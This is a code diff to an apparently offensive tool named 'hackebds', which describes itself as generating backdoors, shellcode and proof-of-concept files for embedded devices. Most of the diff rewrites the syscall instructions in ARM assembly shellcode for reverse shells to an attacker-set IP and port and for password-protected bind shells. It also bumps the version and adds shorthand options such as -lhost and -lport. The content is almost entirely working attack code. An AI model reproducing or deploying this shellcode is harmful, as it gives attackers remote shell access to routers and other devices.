@@ -622,22 +622,22 @@ def armelv5_backdoor(shell_path ,reverse_ip,reverse_port, envp,filename=None):
 	eor r2,r2,r2
 	mov r7,#200
 	add r7,r7,#81
-	svc #0
+	svc 0x900119
 	mov r6,r0
 	mov r1,r5
 	mov r2,#0x10
 	add r7,r7,#2
-	svc #0
+	svc 0x90011b
 	mov r0,r6
 	eor r1,r1,r1
 	mov r7,#63
-	svc #0
+	svc 0x90003f
 	mov r0,r6
 	add r1,r1,#1
-	svc #0
+	svc 0x90003f
 	mov r0,r6
 	add r1,r1,#1
-	svc #0
+	svc 0x90003f
 	mov r0,r4
 	eor r1,r1,r1
 	eor r2,r2,r2
@@ -645,7 +645,7 @@ def armelv5_backdoor(shell_path ,reverse_ip,reverse_port, envp,filename=None):
 	push {r0,r8}
 	mov r1,sp
 	mov r7,#0xb
-	svc #0
+	svc 0x90000b
 
 	'''
 	elif shell_path == "/bin/sh" or shell_path == "sh":
@@ -695,22 +695,22 @@ def armelv5_backdoor(shell_path ,reverse_ip,reverse_port, envp,filename=None):
 	eor r2,r2,r2
 	mov r7,#200
 	add r7,r7,#81
-	svc #1
+	svc 0x900119
 	mov r6,r0
 	mov r1,r5
 	mov r2,#0x10
 	add r7,r7,#2
-	svc #1
+	svc 0x90011b
 	mov r0,r6
 	eor r1,r1,r1
 	mov r7,#63
-	svc #1
+	svc 0x90003f
 	mov r0,r6
 	add r1,r1,#1
-	svc #1
+	svc 0x90003f
 	mov r0,r6
 	add r1,r1,#1
-	svc #1
+	svc 0x90003f
 	mov r0,r4
 	eor r1,r1,r1
 	eor r2,r2,r2
@@ -718,7 +718,7 @@ def armelv5_backdoor(shell_path ,reverse_ip,reverse_port, envp,filename=None):
 	push {r0,r8}
 	mov r1,sp
 	mov r7,#0xb
-	svc #1
+	svc 0x90000b
 
 	'''
 	else:
@@ -839,29 +839,29 @@ def armelv5_reverse_sl(reverse_ip,reverse_port):
 	eor r2,r2,r2
 	mov r7,#200
 	add r7,r7,#81
-	svc #1
+	svc 0x900119
 	mov r6,r0
 	mov r1,r5
 	mov r2,#0x10
 	add r7,r7,#2
-	svc #1
+	svc 0x90011b
 	mov r0,r6
 	eor r1,r1,r1
 	mov r7,#63
-	svc #1
+	svc 0x90003f
 	mov r0,r6
 	add r1,r1,#1
-	svc #1
+	svc 0x90003f
 	mov r0,r6
 	add r1,r1,#1
-	svc #1
+	svc 0x90003f
 	mov r0,r4
 	eor r1,r1,r1
 	eor r2,r2,r2
 	push {r0,r1}
 	mov r1,sp
 	mov r7,#0xb
-	svc #1
+	svc 0x90000b
 	'''
 	log.success("reverse_ip is set to "+ reverse_ip)
 	log.success("reverse_port is set to "+ str(reverse_port))
@@ -1070,29 +1070,29 @@ def armebv5_reverse_sl(reverse_ip,reverse_port):
 	eor r2,r2,r2
 	mov r7,#200
 	add r7,r7,#81
-	svc #1
+	svc 0x900119
 	mov r6,r0
 	mov r1,r5
 	mov r2,#0x10
 	add r7,r7,#2
-	svc #1
+	svc 0x90011b
 	mov r0,r6
 	eor r1,r1,r1
 	mov r7,#63
-	svc #1
+	svc 0x90003f
 	mov r0,r6
 	add r1,r1,#1
-	svc #1
+	svc 0x90003f
 	mov r0,r6
 	add r1,r1,#1
-	svc #1
+	svc 0x90003f
 	mov r0,r4
 	eor r1,r1,r1
 	eor r2,r2,r2
 	push {r0,r1}
 	mov r1,sp
 	mov r7,#0xb
-	svc #1
+	svc 0x90000b
 	'''
 	log.success("reverse_ip is set to "+ reverse_ip)
 	log.success("reverse_port is set to "+ str(reverse_port))
@@ -1274,22 +1274,22 @@ def armebv5_backdoor(shell_path ,reverse_ip,reverse_port, envp,filename=None):
 	eor r2,r2,r2
 	mov r7,#200
 	add r7,r7,#81
-	svc #0
+	svc 0x900119
 	mov r6,r0
 	mov r1,r5
 	mov r2,#0x10
 	add r7,r7,#2
-	svc #0
+	svc 0x90011b
 	mov r0,r6
 	eor r1,r1,r1
 	mov r7,#63
-	svc #0
+	svc 0x90003f
 	mov r0,r6
 	add r1,r1,#1
-	svc #0
+	svc 0x90003f
 	mov r0,r6
 	add r1,r1,#1
-	svc #0
+	svc 0x90003f
 	mov r0,r4
 	eor r1,r1,r1
 	eor r2,r2,r2
@@ -1297,7 +1297,7 @@ def armebv5_backdoor(shell_path ,reverse_ip,reverse_port, envp,filename=None):
 	push {r0,r8}
 	mov r1,sp
 	mov r7,#0xb
-	svc #0
+	svc 0x90000b
 	'''
 	elif shell_path == "/bin/sh" or shell_path == "sh":
 		shellcode = '''
@@ -1349,22 +1349,22 @@ def armebv5_backdoor(shell_path ,reverse_ip,reverse_port, envp,filename=None):
 	eor r2,r2,r2
 	mov r7,#200
 	add r7,r7,#81
-	svc #0
+	svc 0x900119
 	mov r6,r0
 	mov r1,r5
 	mov r2,#0x10
 	add r7,r7,#2
-	svc #0
+	svc 0x90011b
 	mov r0,r6
 	eor r1,r1,r1
 	mov r7,#63
-	svc #0
+	svc 0x90003f
 	mov r0,r6
 	add r1,r1,#1
-	svc #0
+	svc 0x90003f
 	mov r0,r6
 	add r1,r1,#1
-	svc #0
+	svc 0x90003f
 	mov r0,r4
 	eor r1,r1,r1
 	eor r2,r2,r2
@@ -1372,7 +1372,7 @@ def armebv5_backdoor(shell_path ,reverse_ip,reverse_port, envp,filename=None):
 	push {r0,r8}
 	mov r1,sp
 	mov r7,#0xb
-	svc #0
+	svc 0x90000b
 	'''
 	else:
 		log.info("now shell is only support sh and bash")
@@ -4321,7 +4321,7 @@ def armelv5_bind_shell(listen_port, passwd, filename=None):
     eor  r2, r2 ,r2/* 0 (#0) */
     mov r7, #0xff /* 0x119 */
     add r7,r7,0x1a
-    svc  #0
+    svc  0x900119
 	'''
 
 	shellcode += bind_shellcode
@@ -4331,17 +4331,17 @@ def armelv5_bind_shell(listen_port, passwd, filename=None):
 	mov  r2,#0x10  
 	mov r7,#0xff
 	add r7,r7,0x1b
-	svc #0
+	svc 0x90011a
 	mov r0,r6
 	eor r1,r1
 	mov r7,#0xff
 	add r7,r7,29
-	svc #0
+	svc 0x90011c
 	mov r0,r6
 	eor r2,r2
 	mov r7, #0xff
 	add r7,r7,30
-    svc #0
+    svc 0x90011d
     mov r6,r0
 	mov r7,#0x20
 	strb r7,[sp,#-0x30]
@@ -4365,23 +4365,23 @@ def armelv5_bind_shell(listen_port, passwd, filename=None):
 	mov  r2, #8
 	/* call write() */
 	mov r7, #SYS_write /* 4 */
-	svc  #0
+	svc  0x900004
 	sub  sp, 0x20
 	mov  r0, r6
 	mov  r1, sp
 	mov  r2, #%s
 	mov  r7, #3
-	svc  #0
+	svc  0x900003
 	mov r0,r6
 	eor r1,r1,r1
 	mov r7,#63
-	svc #0
+	svc 0x90003f
 	mov r0,r6
 	add r1,r1,#1
-	svc #0
+	svc 0x90003f
 	mov r0,r6
 	add r1,r1,#1
-	svc #0
+	svc 0x90003f
 	mov  r7,sp
 	ldr  r1,[r7]
 	'''
@@ -4399,7 +4399,7 @@ def armelv5_bind_shell(listen_port, passwd, filename=None):
 	push {r0,r8}
 	mov r1,sp
 	mov r7,#0xb
-	svc #0
+	svc 0x90000b
 	'''
 	shellcode = shellcode % ( passwd_len)
 
@@ -4532,7 +4532,7 @@ def armebv5_bind_shell(listen_port, passwd, filename=None):
     eor  r2, r2 ,r2/* 0 (#0) */
     /* call socket() */
     mov r7, #SYS_socket /* 0x119 */
-    svc  #0
+    svc  0x900119
 	'''
 
 	shellcode += bind_shellcode
@@ -4541,29 +4541,29 @@ def armebv5_bind_shell(listen_port, passwd, filename=None):
 	mov  r1,sp
 	mov  r2,#0x10  
 	mov r7, 0x11a
-	svc #0
+	svc 0x90011a
 	mov r0,r6
 	eor r1,r1
 	mov r7,#284
-	svc #0
+	svc 0x90011c
 	mov r0,r6
 	eor r2,r2
 	mov r7, 0x11d
-	svc #0
+	svc 0x90011d 
 	mov r6,r0
 
 	mov r1,#2
 	mov r0,r6
 	mov r7,#63
-	svc #0
+	svc 0x90003f
 	sub r1, r1, #1
 	mov r0, r6
 	mov r7,#63
-	svc #0
+	svc 0x90003f
 	sub r1, r1, #1
 	mov r0, r6
 	mov r7, 63
-	svc #0
+	svc 0x90003f
 
 	mov r7,#0x20
 	strb r7,[sp,#-0x30]
@@ -4587,13 +4587,13 @@ def armebv5_bind_shell(listen_port, passwd, filename=None):
 	mov  r2, #8
 	/* call write() */
 	mov r7, #SYS_write /* 4 */
-	svc  #0
+	svc  0x900004
 	sub  sp, 0x20
 	mov  r0, r6
 	mov  r1, sp
 	mov  r2, #%s
 	mov  r7, #3
-	svc  #0
+	svc  0x900003
 	mov  r7,sp
 	ldr  r1,[r7]
 	'''
@@ -4618,7 +4618,7 @@ def armebv5_bind_shell(listen_port, passwd, filename=None):
 	push {r0,r8}
 	mov r1,sp
 	mov r7,#0xb
-	svc #0
+	svc 0x90000b
 	'''
 
 	shellcode += '''
@@ -4818,7 +4818,7 @@ def test1():
 '''
 
 def get_version():
-    return Fore.GREEN+"Version: 0.3.7"+Fore.RESET
+    return Fore.GREEN+"Version: 0.3.8"+Fore.RESET
 
 
 '''
@@ -5061,20 +5061,20 @@ def main():
                     prog = 'hackebds',
                     description = 'This tool is used for backdoor,shellcode generation,Information retrieval and POC arrangement for various architecture devices',
                     )
-	parser.add_argument('-reverse_ip', required=False, type=str, default=None, help='reverse_ip set')
-	parser.add_argument('-reverse_port', required=False, type=int, default=None ,help='reverse_port set')
+	parser.add_argument('-reverse_ip','-lhost', required=False, type=str, default=None, help='reverse_ip set')
+	parser.add_argument('-reverse_port','-lport', required=False, type=int, default=None ,help='reverse_port set')
 	parser.add_argument('-arch', required=False, type=str, help='Target arch architecturet', choices=('aarch64', 'android', 'armebv5', 'armebv7', 'armelv5', 'armelv7', 'mips', 'mips64', 'mipsel', 'mips64el', 'mipsn32','mipsn32el','powerpc', 'powerpc64', 'powerpc64le', 'powerpcle', 'riscv64', 'sparc', 'sparc64', 'x64', 'x86'))
 	parser.add_argument('-res', required=False,type=str,default=None, choices=('reverse_shell_file', 'reverse_shellcode', 'bind_shell','cmd_file','cveinfo'))
 	parser.add_argument('-passwd', required=False, type=str,default="1234", help='bind_shell set connect passwd')
-	parser.add_argument('-model', required=False, type=str ,default=None, help='device model,learn module')
-	parser.add_argument('-bind_port', required=False, type=int,default=None, help='bind_shell port')
-	parser.add_argument('-filename', required=False, type=str,default=None, help='Generate file name')
+	parser.add_argument('-model','-m' ,required=False, type=str ,default=None, help='device model,learn module')
+	parser.add_argument('-bind_port','-bind', required=False, type=int,default=None, help='bind_shell port')
+	parser.add_argument('-filename', '-f', required=False, type=str,default=None, help='Generate file name')
 	parser.add_argument('-shell', required=False, type=str,default="/bin/sh", help='cmd shell or execute file path')
 	parser.add_argument('-cmd', required=False, type=str,default=None, help='Commands executed')
 	parser.add_argument('-envp', required=False, type=str,default=None, help='Commands envp')
 	parser.add_argument('-sleep', required=False, type=int,default=5, help='the interval time in the continuous bounce shell, in seconds default is 5')
 	parser.add_argument('-encode', '--encode' ,action='store_true', help='encode backdoor')
-	parser.add_argument('-power', '--power' ,action='store_true',help='powerful reverse shell_file or bind_shell file')
+	parser.add_argument('-power','--power' ,action='store_true',help='powerful reverse shell_file or bind_shell file')
 	parser.add_argument('-s', '--search' ,action='store_true',help='Basic information and POC of search device')
 	parser.add_argument('-l', '--list' ,action='store_true',help='print model information list')
 	parser.add_argument('-p', '--poc' ,action='store_true',help='generated model\'s POC file')
